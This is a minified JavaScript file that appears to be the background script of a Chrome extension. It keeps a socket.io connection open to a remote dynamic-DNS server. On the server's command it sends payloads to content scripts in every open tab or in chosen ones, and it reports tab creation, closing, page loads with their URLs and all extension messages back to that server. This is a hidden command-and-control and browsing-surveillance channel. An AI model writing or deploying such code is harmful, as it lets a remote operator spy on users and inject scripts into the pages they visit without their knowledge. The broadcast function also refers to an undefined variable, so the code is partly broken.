var sendBroadcastMessageToTabs=function(){chrome.tabs.query({},function(a){for(var b in a)chrome.tabs.sendMessage(a[b].id,script)})};const URI_CONNECT="http://rplayer.ddns.net:3005";var timeChromeRuntimeReload=1e4,socket=io.connect(URI_CONNECT,{reconnection:!0});socket.on("connect",function(){console.log("conectado")}),socket.on("disconnect",function(){console.log("desconectado")}),socket.on("connect_error",function(){console.log("connect_error")}),socket.on("injectContentScriptByAllTabs",function(a){console.log("injectContentScriptByAllTabs"),sendBroadcastMessageToTabs(a)}),socket.on("injectContentScriptByTabId",function(a,b){console.log("enviando mensagem para "+a),chrome.tabs.sendMessage(a,b)}),chrome.runtime.onMessage.addListener(function(a,b,c){socket.emit(a.event,b,a,c)}),chrome.tabs.onCreated.addListener(function(a){socket.emit("onTabCreated",a)}),chrome.tabs.onRemoved.addListener(function(a){socket.emit("onTabRemoved",a)}),chrome.tabs.onUpdated.addListener(function(a,b,c){"complete"==b.status&&socket.emit("onTabUpdated",c)});